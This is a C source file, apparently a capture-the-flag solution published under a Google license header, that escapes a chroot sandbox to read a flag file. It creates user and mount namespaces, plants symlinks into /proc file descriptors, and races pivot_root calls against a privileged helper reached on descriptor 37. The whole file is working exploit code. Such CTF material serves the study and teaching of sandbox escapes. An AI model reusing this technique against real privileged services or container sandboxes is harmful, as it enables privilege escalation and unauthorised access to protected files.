/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>
#include <string.h>
#include <limits.h>

#define TMP_PATH "/mytmp"
#define CHROOT_PATH "/mychroot"

int init_chroot() {
  if (mkdir(CHROOT_PATH, 0777) && errno != EEXIST) {
    perror("mkdir chroot path");
    return -1;
  }
  if (mkdir(TMP_PATH, 0777) && errno != EEXIST) {
    perror("mkdir chroot path");
    return -1;
  }
  if (mkdir(TMP_PATH "source", 0777) && errno != EEXIST) {
    perror("mkdir source in chroot");
    return -1;
  }
  if (mkdir(TMP_PATH "dest", 0777) && errno != EEXIST) {
    perror("mkdir dest in chroot");
    return -1;
  }
  if (chmod(TMP_PATH "dest", 02777)) {
    perror("chmod dest in chroot");
    return -1;
  }
  if (mount(TMP_PATH "source", CHROOT_PATH, "", MS_BIND | MS_REC, NULL)) {
    perror("mount source to chroot");
    return -1;
  }
  if (mkdir(CHROOT_PATH "/dest", 0777) && errno != EEXIST) {
    perror("mkdir dest in mounted chroot");
    return -1;
  }
  if (mount(TMP_PATH "dest", CHROOT_PATH "/dest", "", MS_BIND | MS_REC, NULL)) {
    perror("mount dest to chroot/dest");
    return -1;
  }
  if (mkdir(CHROOT_PATH "/dest/source", 0777) && errno != EEXIST) {
    perror("mkdir source in chroot/dest");
    return -1;
  }
  return 0;
}

char line[256];
char key[35];

void read_line(int fd) {
  int size;
  for (size = 0; size < sizeof(line)-1; ++size) {
    char c;
    int r = read(fd, &c, 1);
    if (r <= 0 || c == '\n') {
      break;
    }
    line[size] = c;
  }
  line[size] = '\0';
}

int find_my_pid() {
  if (mkdir("pidtest", 0777) && errno != EEXIST) {
    perror("mkdir pidtest path");
    return -1;
  }
  int key_fd = open("pidtest/key", O_WRONLY | O_CREAT);
  if (key_fd == -1) {
    perror("open pidtest key file");
    return -1;
  }
  if (write(key_fd, key, sizeof(key)) != sizeof(key)) {
    perror("writing key");
    return -1;
  }
  close(key_fd);
  int fd = open("pidtest", O_PATH);
  if (fd == -1) {
    perror("open pidtest path");
    return -1;
  }
  if (dup2(fd, 0) == -1) {
    perror("dup2");
    return -1;
  }
  for (int i = 1; i < 1000; ++i) {
    char dest[256];
    sprintf(dest, "/proc/%d/fd/0", i);
    if (symlink(dest, "test") != 0) {
      perror("symlink");
      return -1;
    }
    char* cmd = "gimme flag\ntest\n";
    write(37, cmd, strlen(cmd));
    read_line(37);
    if (strcmp(line, "ok") == 0) {
      return i;
    }
    if (strcmp(line, "error") == 0) {
      read_line(37);
    }
    if (unlink("test") != 0) {
      perror("unlink");
      return -1;
    }
  }
  fprintf(stderr, "could not find own pid");
  return -1;
}

int try_get_flag(int my_pid) {
  char path[PATH_MAX];
  sprintf(path, "/proc/%d/fd/5", my_pid);
  if (symlink(path, "link") != 0) {
    perror("symlink");
    return -1;
  }
  if (syscall(__NR_pivot_root, CHROOT_PATH, CHROOT_PATH "/dest")) {
    perror("initial pivot");
    return -1;
  }
  if (umount2("/dest", MNT_DETACH)) {
    perror("umount real root");
    return -1;
  }
  sprintf(path, "/proc/%d/fd/6", my_pid);
  if (symlink(path, "key") != 0) {
    perror("symlink");
    return -1;
  }
  int fd = open("/", O_PATH);
  if (fd == -1) {
    perror("open");
    return -1;
  }
  dup2(fd, 5);
  dup2(fd, 6);
  int p[2];
  pipe(p);
  dup2(p[0], 6);
  if (chdir("/dest") != 0) {
    perror("chdir");
    return -1;
  }
  char* cmd = "gimme flag\nlink\n";
  write(37, cmd, strlen(cmd));
  sleep(1);
  if (syscall(__NR_pivot_root, ".", "./source")) {
    perror("second pivot");
    return -1;
  }
  write(p[1], key, sizeof(key));
  read_line(37);
  if (strcmp(line, "ok") != 0) {
    puts("sth went wrong...");
    puts(line);
    if (strcmp(line, "error") == 0) {
      read_line(37);
      puts(line);
    }
    return -1;
  }
  int flag = open("/flag", O_RDONLY);
  if (flag < 0) {
    puts("race not won?");
    return -1;
  }
  int size = read(flag, line, sizeof(line)-1);
  if (size < 0) {
    perror("error on read");
    return -1;
  }
  line[size] = '\0';
  puts(line);
  return 0;
}

int do_namespaces() {
  uid_t uid = getuid();
  gid_t gid = getgid();
  if (unshare(CLONE_NEWUSER | CLONE_NEWNS)) {
    perror("unshare");
    return -1;
  }
  int fd = open("/proc/self/setgroups", O_WRONLY);
  if (fd == -1) {
    perror("open /proc/self/setgroups");
    return -1;
  }
  dprintf(fd, "deny");
  close(fd);
  fd = open("/proc/self/uid_map", O_WRONLY);
  if (fd == -1) {
    perror("open /proc/self/uid_map");
    return -1;
  }
  dprintf(fd, "1000 %d 1", uid);
  close(fd);
  fd = open("/proc/self/gid_map", O_WRONLY);
  if (fd == -1) {
    perror("open /proc/self/gid_map");
    return -1;
  }
  dprintf(fd, "1000 %d 1", gid);
  close(fd);
  return 0;
}

int main(int argc, char* argv[]) {
  umask(0);
  int my_pid = find_my_pid();
  if (my_pid < 0) {
    return -1;
  }
  if (do_namespaces() != 0) {
    return -1;
  }
  if (init_chroot() != 0) {
    return -1;
  }
  try_get_flag(my_pid);
  return 0;
}
